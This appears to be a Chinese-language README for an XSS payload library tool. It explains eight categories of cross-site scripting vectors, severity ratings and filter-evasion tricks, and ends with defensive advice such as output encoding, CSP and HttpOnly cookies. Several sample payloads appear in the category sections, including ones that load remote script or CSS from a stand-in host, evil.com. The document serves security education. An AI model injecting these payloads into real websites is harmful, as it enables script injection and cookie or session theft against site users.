# XSS Payload库使用说明

## 📸 页面截图

### Payload库主页面
![Payload库页面1](../img/payload_library1.png)

### Payload库功能展示
![Payload库页面2](../img/payload_library2.png)

### Payload测试页面
![Payload测试页面](../img/test_payload.png)

---

## 📖 简介

XSS Payload库是一个收集了常见XSS攻击向量的资源库，用于安全研究和教育目的。目前收录了**235+个Payload**，每个Payload都经过分类整理，并标注了危害等级和适用场景。

## 🎯 功能特点

### 1. 分类展示
Payload库按照攻击方式分为8大类别：

- **JavaScript URL** - 通过JavaScript伪协议执行的XSS
- **HTML事件属性** - 利用HTML事件处理器触发的XSS
- **Script标签** - 直接使用script标签的XSS
- **IMG标签** - 利用图片标签的XSS
- **iframe标签** - 通过iframe注入的XSS
- **SVG标签** - 使用SVG元素的XSS
- **CSS样式注入** - 通过CSS执行的XSS
- **高级绕过技术** - 各种编码和混淆绕过技术

### 2. 危害等级
每个Payload都标注了危害等级：

- 🟢 **低危** - 基础向量，容易被过滤
- 🟡 **中危** - 需要特定条件触发
- 🟠 **高危** - 绕过常见防御措施
- 🔴 **严重** - 高危绕过技术，危害极大

### 3. 交互功能

#### 一键复制
点击"复制Payload"按钮，自动将Payload复制到剪贴板。

#### 在线测试
点击"测试"按钮，在新窗口中打开测试环境，实时查看Payload效果。

#### 搜索过滤
- 支持关键词搜索
- 支持按危害等级筛选

## 📚 Payload分类详解

### 1. JavaScript URL类

这类Payload通过`javascript:`伪协议执行代码，常见于链接的href属性。

**示例：**
```html
<a href="javascript:alert('XSS')">点击测试</a>
```

**绕过技巧：**
- HTML实体编码：`&#106;&#97;&#118;...`
- Unicode编码：`\u0061\u006c\u0065\u0072\u0074`
- 大小写混合：`JaVaScRiPt`
- 空白字符：`jav\tascript`

### 2. HTML事件属性类

利用HTML元素的事件处理器执行JavaScript代码。

**常见事件：**
- `onerror` - 资源加载错误时触发
- `onload` - 元素加载完成时触发
- `onclick` - 点击时触发
- `onmouseover` - 鼠标悬停时触发
- `onfocus` - 获得焦点时触发

**示例：**
```html
<img src=x onerror=alert(1)>
<input onfocus=alert(1) autofocus>
```

### 3. Script标签类

直接使用`<script>`标签执行代码。

**绕过技巧：**
- 大小写混合：`<ScRiPt>`
- 编码绕过：Unicode、十六进制、Base64
- 动态执行：eval、setTimeout、Function构造函数

**示例：**
```html
<script>alert('XSS')</script>
<script>eval('\x61\x6c\x65\x72\x74(1)')</script>
```

### 4. IMG标签类

利用图片标签的特性执行XSS。

**特点：**
- `onerror`事件最常用
- 不需要用户交互
- 可以动态加载外部脚本

**示例：**
```html
<img src=x onerror=alert(1)>
<img src=x onerror="s=document.createElement('script');s.src='http://evil.com/xss.js';document.body.appendChild(s);">
```

### 5. iframe标签类

通过iframe注入恶意内容。

**特点：**
- 可以加载完整页面
- 支持Data URI
- 可以嵌入外部资源

**示例：**
```html
<iframe src="javascript:alert('XSS')"></iframe>
<iframe src="data:text/html;base64,PHNjcmlwdD5hbGVydCgxKTwvc2NyaXB0Pg=="></iframe>
```

### 6. SVG标签类

利用SVG元素的特性执行XSS。

**特点：**
- 支持内联脚本
- 支持事件处理器
- 可以绕过某些过滤器

**示例：**
```html
<svg onload=alert(1)>
<svg><script>alert('XSS')</script></svg>
```

### 7. CSS样式注入类

通过CSS样式执行代码（主要针对旧版IE浏览器）。

**特点：**
- CSS expression（IE专有）
- 外部样式表导入
- 背景图片注入

**示例：**
```html
<div style="width: expression(alert('XSS'))">
<style>@import url("http://evil.com/xss.css");</style>
```

### 8. 高级绕过技术类

各种高级编码和混淆技术。

**常见技术：**
- **双写绕过**：`<scr<script>ipt>`
- **空字节截断**：`<scr\x00ipt>`
- **注释混淆**：`alert/**/(/**/'XSS'/**/)`
- **JSFuck编码**：仅用`[]()!+`六个字符编写代码
- **模板字符串**：`alert\`XSS\``

## 🛡️ 防御建议

### 1. 输入过滤
- 对所有用户输入进行严格过滤
- 使用白名单机制，只允许安全的字符
- 过滤或转义特殊字符：`< > " ' &`

### 2. 输出编码
根据输出上下文选择合适的编码方式：

- **HTML上下文**：使用`htmlspecialchars()`
- **JavaScript上下文**：使用`json_encode()`
- **URL上下文**：使用`urlencode()`
- **CSS上下文**：避免用户输入

### 3. 内容安全策略（CSP）
配置严格的CSP策略：

```http
Content-Security-Policy: default-src 'self'; script-src 'self' 'unsafe-inline'; object-src 'none';
```

### 4. HttpOnly Cookie
设置Cookie的HttpOnly属性，防止JavaScript读取敏感Cookie。

```php
setcookie("session", $value, time()+3600, "/", "", true, true);
```

### 5. X-XSS-Protection
启用浏览器的XSS过滤器：

```http
X-XSS-Protection: 1; mode=block
```

## ⚠️ 法律声明

**本Payload库仅供安全研究和教育目的使用！**

- 未经授权对他人网站进行XSS攻击属于违法行为
- 使用本库中的Payload进行非法攻击，后果自负
- 请在合法授权的测试环境中使用

## 📖 参考资料

- [OWASP XSS Prevention Cheat Sheet](https://cheatsheetseries.owasp.org/cheatsheets/Cross_Site_Scripting_Prevention_Cheat_Sheet.html)
- [PortSwigger XSS Cheat Sheet](https://portswigger.net/web-security/cross-site-scripting/cheat-sheet)
- [XSS Filter Evasion Cheat Sheet](https://owasp.org/www-community/xss-filter-evasion-cheatsheet)

## 📝 更新日志

### v1.0.0 (2026-05-27)
- ✨ 初始版本发布
- ✨ 收集80+个常见XSS Payload
- ✨ 实现8大分类展示
- ✨ 添加危害等级标注
- ✨ 实现一键复制和测试功能
- ✨ 支持搜索和筛选

## 👤 作者

- **作者**：Guojin0826
- **邮箱**：jinrcsy@gmail.com
- **GitHub**：https://github.com/Guojin0826

## 📄 许可证

本项目采用 MIT 许可证，详见 [LICENSE](../LICENSE) 文件。

**特别声明**：本项目仅供教育和研究目的，作者不对任何滥用行为承担责任。
